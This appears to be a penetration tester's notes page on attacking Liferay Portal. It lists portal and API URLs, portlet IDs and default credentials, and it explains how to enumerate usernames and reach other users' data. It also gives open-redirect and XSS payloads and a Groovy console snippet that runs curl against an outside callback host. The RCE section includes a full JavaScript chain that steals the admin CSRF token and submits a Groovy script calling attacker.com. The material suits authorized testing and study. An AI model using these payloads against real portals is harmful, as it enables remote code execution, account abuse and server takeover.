# Interesting URLs

#### Login portal

```
/?p_p_id=58&p_p_lifecycle=0&p_p_state=maximized&p_p_mode=view&saveLastPath=false&_58_struts_action=%2Flogin%2Flogin
/?p_p_id=com_liferay_login_web_portlet_LoginPortlet&p_p_lifecycle=0&p_p_state=maximized
/c/portal/login
/login
```

#### Register portal

```
/?p_p_id=com_liferay_login_web_portlet_LoginPortlet&p_p_lifecycle=0&p_p_state=maximized&p_p_mode=view&saveLastPath=false&_com_liferay_login_web_portlet_LoginPortlet_mvcRenderCommandName=%2Flogin%2Fcreate_account
```

#### API Portals

```
/api/
/api/axis
/api/jsonws
/o/api
/o/graphql
/o/headless/*
```

#### User profile

```
/user/<username>
/user/<username>/manage
```

#### User web pages ^6dec27

```
/web/guest
/web/<username>
/web/guest/home
/web/<username>/home
```

#### Groups

```
/group/guest
/group/<username>
```

#### Control panel ^700327

```
/group/control_panel/manage
/group/guest/control_panel/manage
/group/guest/~/control_panel/manage
/group/<username>/control_panel/manage
/group/<username>/~/control_panel/manage
```

If they only show a message but not any configuration menu, it may be possible to combine it with a portlet URL to get access to the control panel, for example:

```
/group/control_panel/manage?p_p_state=maximized&p_p_mode=view&p_p_id=com_liferay_login_web_portlet_LoginPortlet
```

![[liferay_control_panel_1.PNG]]
![[liferay_control_panel_2.PNG]]

#### License panel

```
/c/portal/license
```
# Access to other users data

Authenticated users may be able to access other users data from the control panel by providing another username:

```
/group/<username>/control_panel/manage
/group/<username>/~/control_panel/manage
```

This can also be used to enumerate valid usernames, since invalid ones will produce a 404 error.

# Portlets

Liferay applications are divided into [portlets](https://help.liferay.com/hc/es/articles/360018159431-Introduction-to-Portlets), which are little web applications, usually written in Java, that provide a certain functionality to the portal. By default, every Liferay portal comes with many portlets developed by Liferay itself but the maintainers of the portal can create custom ones too.

Portlets can be accessed with the following URL:

```
/?p_p_lifecycle=0&p_p_state=<window_state>& p_p_mode=<mode>&p_p_id=<portlet_ID>
```

- `window_state`: Controls the amount of space a portlet takes up on a page. Possible values are:
	- `normal`
	- `maximized`
	- `minimized`
- `mode`: Controls the portlet's current function. Possible values are:
	- `view`
	- `edit`
	- `help`
- `portlet_ID`: Controls the portlet to be executed. Can be either the numeric ID or the string ID

As an example, the URL to access the login portlet may be something like this:

```
/?p_p_state=maximized&p_p_mode=view&p_p_id=com_liferay_login_web_portlet_LoginPortlet
```

## Portlet IDs

An attacker can enumerate all available portlets by iterating over each portlet ID, whether they are numeric or string IDs.

### Numeric IDs

Numeric IDs are not well documented, but due to their nature, they are easy to bruteforce.
### String IDs

Liferay maintains a [list](https://help.liferay.com/hc/en-us/articles/360018511712-Fully-Qualified-Portlet-IDs) of all default portlets and their string IDs:

**Collaboration**

| Portlet                    | ID                                                                       |
| -------------------------- | ------------------------------------------------------------------------ |
| Blogs                      | `com_liferay_blogs_web_portlet_BlogsPortlet`                             |
| Blogs Aggregator           | `com_liferay_blogs_web_portlet_BlogsAgreggatorPortlet`                   |
| Calendar                   | `com_liferay_calendar_web_portlet_CalendarPortlet`                       |
| Dynamic Data Lists Display | `com_liferay_dynamic_data_lists_web_portlet_DDLDisplayPortlet`           |
| Form                       | `com_liferay_dynamic_data_mapping_form_web_portlet_DDMFormPortlet`       |
| Invite Members             | `com_liferay_invitation_invite_members_web_portlet_InviteMembersPortlet` |
| Message Boards             | `com_liferay_message_boards_web_portlet_MBPortlet`                       |
| Recent Bloggers            | `com_liferay_blogs_recent_bloggers_web_portlet_RecentBloggersPortlet`    |

**Community**

| Portlet       | ID                                                                  |
| ------------- | ------------------------------------------------------------------- |
| My Sites      | `com_liferay_site_my_sites_web_portlet_MySitesPortlet`              |
| Page Comments | `com_liferay_comment_page_comments_web_portlet_PageCommentsPortlet` |
| Page Flags    | `com_liferay_flags_web_portlet_PageFlagsPortlet`                    |
| Page Ratings  | `com_liferay_ratings_page_ratings_web_portlet_PageRatingsPortlet`   |

**Content Management**

| Portlet                | ID                                                                                     |
| ---------------------- | -------------------------------------------------------------------------------------- |
| Asset Publisher        | `com_liferay_asset_publisher_web_portlet_AssetPublisherPortlet`                        |
| Breadcrumb             | `com_liferay_site_navigation_breadcrumb_web_portlet_SiteNavigationBreadcrumbPortlet`   |
| Categories Navigation  | `com_liferay_asset_categories_navigation_web_portlet_AssetCategoriesNavigationPortlet` |
| Documents and Media    | `com_liferay_document_library_web_portlet_DLPortlet`                                   |
| Highest Rated Assets   | `com_liferay_asset_publisher_web_portlet_HighestRatedAssetsPortlet`                    |
| Knowledge Base Article | `com_liferay_knowledge_base_web_portlet_ArticlePortlet`                                |
| Knowledge Base Display | `com_liferay_knowledge_base_web_portlet_DisplayPortlet`                                |
| Knowledge Base Search  | `com_liferay_knowledge_base_web_portlet_SearchPortlet`                                 |
| Knowledge Base Section | `com_liferay_knowledge_base_web_portlet_SectionPortlet`                                |
| Media Gallery          | `com_liferay_document_library_web_portlet_IGDisplayPortlet`                            |
| Most Viewed Assets     | `com_liferay_asset_publisher_web_portlet_MostViewedAssetsPortlet`                      |
| Navigation Menu        | `com_liferay_site_navigation_menu_web_portlet_SiteNavigationMenuPortlet`               |
| Nested Applications    | `com_liferay_nested_portlets_web_portlet_NestedPortletsPortlet`                        |
| Polls Display Portlet  | `com_liferay_polls_web_portlet_PollsDisplayPortlet`                                    |
| Related Assets         | `com_liferay_asset_publisher_web_portlet_RelatedAssetsPortlet`                         |
| Site Map               | `com_liferay_site_navigation_site_map_web_portlet_SiteNavigationSiteMapPortlet`        |
| Sites Directory        | `com_liferay_site_navigation_directory_web_portlet_SitesDirectoryPortlet`              |
| Tag Cloud              | `com_liferay_asset_tags_navigation_web_portlet_AssetTagsCloudPortlet`                  |
| Tags Navigation        | `com_liferay_asset_tags_navigation_web_portlet_AssetTagsNavigationPortlet`             |
| Web Content Display    | `com_liferay_journal_content_web_portlet_JournalContentPortlet`                        |

**News**

| Portlet                | ID                                                             |
| ---------------------- | -------------------------------------------------------------- |
| Alerts                 | `com_liferay_announcements_web_portlet_AlertsPortlet`          |
| Announcements          | `com_liferay_announcements_web_portlet_AnnouncementsPortlet`   |
| Recent Content Portlet | `com_liferay_asset_publisher_web_portlet_RecentContentPortlet` |

**Sample**

| Portlet     | ID                                                      |
| ----------- | ------------------------------------------------------- |
| Hello World | `com_liferay_hello_world_web_portlet_HelloWorldPortlet` |
| IFrame      | `com_liferay_iframe_web_portlet_IFramePortlet`          |

**Search**

| Portlet         | ID                                                                            |
| --------------- | ----------------------------------------------------------------------------- |
| Category Facet  | `com_liferay_portal_search_web_category_facet_portlet_CategoryFacetPortlet`   |
| Custom Facet    | `com_liferay_portal_search_web_custom_facet_portlet_CustomFacetPortlet`       |
| Folder Facet    | `com_liferay_portal_search_web_folder_facet_portlet_FolderFacetPortlet`       |
| Modified Facet  | `com_liferay_portal_search_web_modified_facet_portlet_ModifiedFacetPortlet`   |
| Search Bar      | `com_liferay_portal_search_web_search_bar_portlet_SearchBarPortlet`           |
| Search Insights | `com_liferay_portal_search_web_search_insights_portlet_SearchInsightsPortlet` |
| Search Options  | `com_liferay_portal_search_web_search_options_portlet_SearchOptionsPortlet`   |
| Search Results  | `com_liferay_portal_search_web_search_results_portlet_SearchResultsPortlet`   |
| Site Facet      | `com_liferay_portal_search_web_site_facet_portlet_SiteFacetPortlet`           |
| Suggestions     | `com_liferay_portal_search_web_suggestions_portlet_SuggestionsPortlet`        |
| Tag Facet       | `com_liferay_portal_search_web_tag_facet_portlet_TagFacetPortlet`             |
| Type Facet      | `com_liferay_portal_search_web_type_facet_portlet_TypeFacetPortlet`           |
| User Facet      | `com_liferay_portal_search_web_user_facet_portlet_UserFacetPortlet`           |

**Social**

| Portlet         | ID                                                                  |
| --------------- | ------------------------------------------------------------------- |
| Activities      | `com_liferay_social_activities_web_portlet_SocialActivitiesPortlet` |
| Contacts Center | `com_liferay_contacts_web_portlet_ContactsCenterPortlet`            |
| Members         | `com_liferay_social_networking_web_members_portlet_MembersPortlet`  |
| My Contacts     | `com_liferay_contacts_web_portlet_MyContactsPortlet`                |
| Profile         | `com_liferay_contacts_web_portlet_ProfilePortlet`                   |

**Tools**

| Portlet           | ID                                                                               |
| ----------------- | -------------------------------------------------------------------------------- |
| Language Selector | `com_liferay_site_navigation_language_web_portlet_SiteNavigationLanguagePortlet` |
| Search            | `com_liferay_portal_search_web_portlet_SearchPortlet`                            |
| Sign In           | `com_liferay_login_web_portlet_LoginPortlet`                                     |

**Wiki**

| Portlet      | ID                                                                      |
| ------------ | ----------------------------------------------------------------------- |
| Page Menu    | `com_liferay_wiki_navigation_web_portlet_WikiNavigationPageMenuPortlet` |
| Tree Menu    | `com_liferay_wiki_navigation_web_portlet_WikiNavigationTreeMenuPortlet` |
| Wiki         | `com_liferay_wiki_web_portlet_WikiPortlet`                              |
| Wiki Display | `com_liferay_wiki_web_portlet_WikiDisplayPortlet`                       |

# Default credentials

```
test@liferay.com:test
```


# Known vulnerabilities
## Open redirect

If misconfigured, there is an Open Redirect vulnerability at the following URLs:

```
/html/common/referer_jsp.jsp?referer=<url>
/html/common/referer_js.jsp?referer=<url>
/html/common/forward_jsp.jsp?FORWARD_URL=<url>
/html/common/forward_js.jsp?FORWARD_URL=<url>
```

## Stored XSS on user pages

If [[#^6dec27|user web pages]] are enabled, it may be possible for users to edit them in the [[Liferay#^700327|control panel]]. There are many ways to add JavaScript to these pages, but the easiest one by far is to go to the configuration panel of `My Profile` and look for the option to add JavaScript code, which will be appended to every page that the user publishes. Since these pages are public, an attacker can use this to exploit an stored XSS vulnerability very easily.

![[liferay_XSS1.png]]
![[liferay_XSS2.png]]

## Reflected XSS

Older versions of Liferay are vulnerable to a reflected XSS in the same resource as some of the Open Redirect vulnerabilities explained before:

```
/html/common/referer_js.jsp?referer=javascript:alert("XSS")
/html/common/forward_js.jsp?FORWARD_URL=javascript:alert("XSS")
```

## RCE on administrator console

### Groovy console

Inside the [[Liferay#^700327|control panel]] for the administrators, there is an option to enable a Groovy console, which can be accessed with the following URL:

```
/group/control_panel/manage?p_p_id=com_liferay_server_admin_web_portlet_ServerAdminPortlet&p_p_lifecycle=0&p_p_state=maximized&p_p_mode=view&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_mvcRenderCommandName=%2Fserver_admin%2Fview&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_tabs1=script
```

It allows running OS commands with the following code:

```java
def sout = new StringBuilder(), serr = new StringBuilder()
def proc = "curl cm2mtu7gfbup86rs1tb0x9fgcncgt5dwu.oast.me".execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "$sout"
```

### Gogo shell

Inside the [[Liferay#^700327|control panel]] for the administrators, there is an option to enable a Gogo shell, which can be accessed with the following URL:

```
/group/control_panel/manage?p_p_id=com_liferay_gogo_shell_web_internal_portlet_GogoShellPortlet&p_p_lifecycle=0&p_p_state=maximized&p_p_mode=view&_com_liferay_gogo_shell_web_internal_portlet_GogoShellPortlet_javax.portlet.action=executeCommand
```

It allows running some OS commands.

This can be chained with an XSS vulnerability to achieve RCE when an admin triggers the XSS:

```javascript
fetch("/group/control_panel/manage?p_p_id=com_liferay_server_admin_web_portlet_ServerAdminPortlet&p_p_lifecycle=0&p_p_state=maximized&p_p_mode=view&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_mvcRenderCommandName=%2Fserver_admin%2Fview&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_tabs1=script")
.then(r => r.text())
.then(t => {
	let p = new DOMParser();
	let h = p.parseFromString(t, 'text/html');
	
	let formData = new FormData();
	d = {
		"_com_liferay_server_admin_web_portlet_ServerAdminPortlet_formDate": h.getElementById("_com_liferay_server_admin_web_portlet_ServerAdminPortlet_formDate").value,
		"_com_liferay_server_admin_web_portlet_ServerAdminPortlet_tabs1": "script",
		"_com_liferay_server_admin_web_portlet_ServerAdminPortlet_redirect": window.location,
		"_com_liferay_server_admin_web_portlet_ServerAdminPortlet_language": "groovy",
		"_com_liferay_server_admin_web_portlet_ServerAdminPortlet_output": "text",
		"_com_liferay_server_admin_web_portlet_ServerAdminPortlet_script": "def sout = new StringBuilder(), serr = new StringBuilder();def proc = 'curl attacker.com'.execute()",
		"_com_liferay_server_admin_web_portlet_ServerAdminPortlet_cmd": "runScript",
		"p_auth": Liferay.authToken
	}
	
	for(const n in d) {
		formData.append(n, d[n]);
	}
	
	fetch("/group/control_panel/manage?p_p_id=com_liferay_server_admin_web_portlet_ServerAdminPortlet&p_p_lifecycle=1&p_p_state=maximized&p_p_mode=view&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_javax.portlet.action=%2Fserver_admin%2Fedit_server", {
		method: "POST",
		body: formData
	})
})
```

## \[CVE-2020-7961\] RCE via deserialization

Deserialization of Untrusted Data in Liferay Portal prior to 7.2.1 CE GA2 allows remote attackers to execute arbitrary code via JSON web services (JSONWS).

[Exploit available](https://github.com/ShutdownRepo/CVE-2020-7961).